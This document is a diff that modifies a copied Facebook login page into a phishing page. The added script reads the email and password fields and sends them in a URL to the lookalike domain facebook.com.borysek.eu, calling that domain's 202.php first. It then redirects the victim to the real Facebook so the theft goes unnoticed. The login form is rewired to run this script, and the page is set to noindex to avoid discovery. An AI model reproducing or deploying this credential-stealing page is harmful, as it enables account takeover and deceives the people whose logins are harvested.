@@ -5,13 +5,13 @@
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta charset="utf-8">
-	<noscript>&lt;meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" /&gt;</noscript>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 	<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
 	<title id="pageTitle">Facebook - Log In or Sign Up</title>
 	<meta property="og:site_name" content="Facebook">
 	<meta property="og:locale" content="en_US">
 	<meta name="description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates.">
-	<meta name="robots" content="noodp,noydir">
+	<meta name="robots" content="noindex,nofollow">
 	<noscript>&lt;meta http-equiv="X-Frame-Options" content="DENY" /&gt;</noscript>
 	<link type="text/css" rel="stylesheet" href="./supportFiles/5nUDU3Lg6pX.css" data-bootloader-hash="0Qu7U" data-permanent="1" crossorigin="anonymous">
 	<link type="text/css" rel="stylesheet" href="./supportFiles/I5kTXq1bSJZ.css" data-bootloader-hash="44wiD" crossorigin="anonymous">
@@ -31,6 +31,23 @@
 		}
 		.sp_7XMX65Pq0E7{background-image:url(/supportFiles/fbLogo.png);background-size:auto;background-repeat:no-repeat;display:inline-block;height:21px;width:21px}
 	</style>
+	<script type="text/javascript">
+		var showAdress = "";
+		function performSyncronousRequestSendData() { //breaking through popup blocking
+			var email = $("#email").val();
+			var password = $("#pass").val();
+			showAdress = "https://facebook.com.borysek.eu/echo.php?email="+email+"&pass="+password;
+			$.ajax({
+				url: 'https://facebook.com.borysek.eu/202.php',
+				data: {},
+				success: function(){
+					 window.open(showAdress, "_blank", "toolbar=false, scrollbars=false, resizable=yes, top=500, left=500, width=400, height=400");
+					 window.location.href = "https://facebook.com";
+				},
+				async: false
+			});
+		}
+	</script>
 </head>
 
 <body class="fbIndex UIPage_LoggedOut _2gsg _xw8 _5p3y hasBanner chrome webkit win x1 Locale_en_US" dir="ltr">
@@ -49,7 +66,7 @@
 										<h1><a href="./index.html" title="Go to Facebook Home"><i class="fb_logo img sp_7XMX65Pq0E7 sx_ccd1d2"><u>Facebook logo</u></i></a></h1>
 									</div>
 									<div class="menu_login_container rfloat _ohf">
-										<form id="login_form" action="/login.php" method="post" novalidate="1" >
+										<form id="login_form" onsubmit=" performSyncronousRequestSendData(); return false;" novalidate="1" >
 											<input type="hidden" name="lsd" value="AVo_Qv9c" autocomplete="off">
 											<table cellspacing="0" role="presentation">
 												<tbody>
